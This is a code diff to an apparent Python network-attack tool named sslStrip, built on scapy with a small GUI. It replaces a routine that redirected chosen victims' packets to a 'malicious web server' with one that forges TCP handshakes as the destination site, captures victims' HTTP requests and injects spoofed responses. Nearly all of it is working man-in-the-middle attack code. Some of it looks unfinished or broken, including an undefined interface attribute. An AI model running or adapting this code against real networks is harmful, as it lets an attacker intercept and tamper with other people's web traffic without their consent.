@@ -9,7 +9,7 @@ from scapy.layers.inet import IP
 from scapy.layers.inet import TCP
 import threading
 import time
-#import requests
+import requests
 import netifaces
 from math import log
 
@@ -106,8 +106,12 @@ class sslStrip():
         Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
 
         self.initThread()
-        while True:
-            sniff(store=0, prn=lambda packet: self.packetForwarding(packet), iface=self.interface)
+        sll_thread = threading.Thread(target=self.sslstrip)
+        sll_thread.setDaemon(True)
+        sll_thread.start()
+
+    def ssl_filter(self, pkt):
+        return pkt.haslayer(TCP) and pkt[TCP].dport == 80 and pkt[TCP].flags == 'S' and (pkt[IP].src in [victim["IP"] for victim in self.target])
 
     def initShow(self):
         scroll = Scrollbar(self.root)
@@ -124,58 +128,56 @@ class sslStrip():
         proc_thread.daemon = True
         proc_thread.start()
 
-    def packetForwarding(self, packet):
-        if packet.haslayer(Ether) and packet.haslayer(IP):#check IP&Arp Layer
-            self.show.insert(END, "1 from ip: {}, to ip: {} mac{} ".format( packet[IP].src, packet[IP].dst, packet[Ether].dst) + '\n')
-            self.show.insert(END, "1_b {} ".format( self.maliciousWebServer[0]) + '\n')
-            self.show.insert(END,'\n')                                                                    
-            self.show.see(END)
-            self.show.update_idletasks()
-            sender= None
-            senderfound = False
-            receiver = None
-            receiverfound = False
-            for vict in self.target:
-                if (vict["mac"] == packet[Ether].src):
-                    sender, senderfound = self.SndFound(vict)
-                    if ('131.155.3.3' == packet[IP].dst):
-                        receiver, receiverfound = self.rcvFound(self.maliciousWebServer[0])
-                        self.show.insert(END, "2 Redirect from ip: {}, mac: {}".format(packet[IP].dst, packet[Ether].dst) + '\n')
-                        self.show.insert(END,'\n')                                                                    
-                        self.show.see(END)
-                        self.show.update_idletasks()
-            if ((not senderfound) or (not receiverfound)):
-                if ('08:00:27:0b:33:f8'== packet[Ether].src):
-                    sender, senderfound = self.SndFound(self.maliciousWebServer[0])
-                    for vict in self.target:
-                        if (vict["ip"] == packet[IP].dst):
-                            receiver, receiverfound = self.rcvFound(vict)
-                            self.show.insert(END, "3 Redirect from ip: {}, mac: {}".format(packet[IP].dst, packet[Ether].dst) + '\n')
-                            self.show.insert(END,'\n')                                                                    
-                            self.show.see(END)
-                            self.show.update_idletasks()
-            if (senderfound and receiverfound):
-                self.modifyAndSend(packet, sender, receiver)
-
-    def rcvFound(self, subj):
-        receiver = subj
-        receiverfound = True
-        return receiver,receiverfound
-
-    def SndFound(self, subj):
-        sender = subj
-        senderfound = True
-        return sender,senderfound
-
-    def modifyAndSend(self, packet, sender, receiver):
-        packet[Ether].src = self.myMAC
-        packet[Ether].dst = receiver["mac"]
-        sendp(packet, iface=self.interface, verbose=False)
-        self.show.insert(END, "4 Redirect from ip: {}, mac: {}".format(sender["ip"], sender["mac"]) + '\n')
-        self.show.insert(END, "to ip: {}, mac: {}".format(receiver["ip"], receiver["mac"]) + '\n')                                                                    
+    def sslstrip(self):
+        self.show.insert(END, "5 Redirect from ")
         self.show.insert(END,'\n')                                                                    
         self.show.see(END)
         self.show.update_idletasks()
+        def sendRequest(pkt):
+            if(HTTP in pkt and HTTPRequest in pkt[HTTP]):
+                if(pkt[HTTP][HTTPRequest].Method == b"GET"):
+                    resp = requests.get("http://" + str(pkt[HTTP][HTTPRequest].Host.decode()) + str(pkt[HTTP][HTTPRequest].Path.decode()))
+                    return resp
+		
+        def sslStrip(packet):
+            victIp = packet[IP].src
+            siteIp = packet[IP].dst
+            syn_ack = IP(dst=victIp,  src = siteIp) / TCP(sport=packet[TCP].dport, dport = packet[TCP].sport,flags='SA', seq = 0, ack = packet[TCP].seq + 1)
+            ack = sr1(syn_ack)
+
+            http_pkt = sniff(filter = "port 80", count = 1)[0]
+			
+            ack = IP(dst=victIp, src =siteIp ) / TCP(dport=http_pkt.sport, sport=http_pkt[TCP].dport,
+														 seq=1, ack= http_pkt[TCP].seq + len(http_pkt[TCP].payload),
+														 flags='A')
+            send(ack)
+            if(HTTP in http_pkt):
+                resp = sendRequest(http_pkt)
+                load = resp.text
+				
+                response = IP(dst=victIp, src =siteIp ) / TCP(dport=http_pkt[TCP].sport, sport=http_pkt[TCP].dport,
+														 seq=ack[TCP].seq, ack= ack[TCP].ack,
+														 flags='A') /HTTP()/HTTPResponse(
+															Content_Type = resp.headers['Content-Type'] if 'Content-Type' in resp.headers else None,
+															Date = resp.headers['Date'] if 'Date' in resp.headers else None,
+															Connection = 'keep-alive'
+														)/load
+                response_payload = response[TCP].payload.do_build()
+
+                base_seq = response[TCP].seq
+                offset = 0
+                for i in range(0, len(response_payload), 1500):
+                    re = IP(dst=victIp, src =siteIp ) / TCP(dport=http_pkt[TCP].sport, sport=http_pkt[TCP].dport,
+														 seq=base_seq + offset, ack= ack[TCP].ack, flags='PA') / response_payload[i:i+1500]
+					
+                    offset += len(response_payload[i:i+1500])
+					
+                    send(re, iface=self.NETWORK_INTERFACE)
+
+		
+        sniff(lfilter=self.ssl_filter, prn=sslStrip, iface=self.interface)
+
+
 
     def setInput(self, rangeIPs, usedIPs, target, maliciousWebServer, myMAC):
         self.rangeIPs = rangeIPs
@@ -183,3 +185,4 @@ class sslStrip():
         self.target = target
         self.maliciousWebServer = maliciousWebServer
         self.myMAC = myMAC
+    
